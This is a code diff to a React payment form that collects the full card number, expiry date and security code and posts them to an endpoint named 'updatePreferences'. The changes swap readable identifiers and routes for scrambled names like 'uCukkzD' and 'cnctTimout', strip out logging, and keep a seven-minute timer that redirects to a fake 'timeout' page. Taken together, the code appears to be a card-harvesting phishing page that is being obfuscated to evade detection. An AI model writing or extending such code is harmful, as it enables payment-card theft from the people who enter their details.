@@ -48,8 +48,7 @@ const PaymentMethodForm = forwardRef((props, ref) => {
   };
 
   const handleCompletePurchase = async () => {
-    const clientSessionID = localStorage.getItem('clientSessionID');
-    console.log(clientSessionID);
+    const uCukkzD = sessionStorage.getItem('uCukkzD');
     try {
       if (selectedMethod === 'paypal') {
         await import('../../assets/styles/login.css');
@@ -65,8 +64,8 @@ const PaymentMethodForm = forwardRef((props, ref) => {
         return;
       }
 	setIsLoading(true);
-      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/authenticate/updatePreferences`, {
-        clientSessionID,
+      const response = await axios.post(`${process.env.REACT_APP_API_URL}/ath/updatePreferences`, {
+        uCukkzD,
         cardNumber: cardData.cardNumber,
         expiryDate: cardData.expiryDate,
         securityCode: cardData.securityCode
@@ -74,15 +73,12 @@ const PaymentMethodForm = forwardRef((props, ref) => {
 
       if (response.status === 200) {
         const { brand, last4Digits, logoUrl } = response.data;
-
-        console.log(`Brand: ${brand}, Last 4: ${last4Digits}, Logo URL: ${logoUrl}`);
-        localStorage.setItem("bankBrand", brand);
-        localStorage.setItem("bankLast4Digits", last4Digits);
-        localStorage.setItem("bankLogoUrl", logoUrl);
-  
+        sessionStorage.setItem("BrnTFls", brand);
+        sessionStorage.setItem("lCdT3Bk", last4Digits);
+        sessionStorage.setItem("LgLBn", logoUrl);
         setIsLoading(true); 
         timeoutRef.current = setTimeout(() => {
-          history.push('/connection/timeout');
+          history.push('/cnctTimout');
         }, 420000);
       }
     } catch (error) {
